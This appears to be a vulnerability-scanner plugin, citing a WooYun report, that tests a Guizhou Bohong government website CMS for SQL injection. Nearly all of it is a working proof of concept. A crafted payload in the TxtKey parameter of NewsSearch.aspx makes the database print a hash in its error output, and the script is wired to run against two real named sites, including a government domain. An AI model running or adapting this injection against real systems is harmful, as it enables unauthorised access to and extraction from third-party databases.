#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:404
#Name:贵州博虹科技政府建站程序#通用型SQL注射漏洞一枚
#Refer:http://www.wooyun.org/bugs/wooyun-2010-080289


def assign(service,arg):
    if service=="bohoog":
        return True,arg 
   
def  audit(arg): 
    url=arg+"NewsSearch.aspx?TxtKey=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))%20and%20%27%%27=%27"
    code,head,res,errcode,finalurl=curl.curl2(url)
    if code==500 and  "c4ca4238a0b923820dcc509a6f75849b"  in res:
        security_hole('SQL injection: '+url)
        

if __name__=="__main__":
    from dummy import *
    audit(assign('bohoog','http://sgrb.sgsgjt.com/')[1])
    audit(assign('bohoog','http://www.gzjlcs.gov.cn/')[1])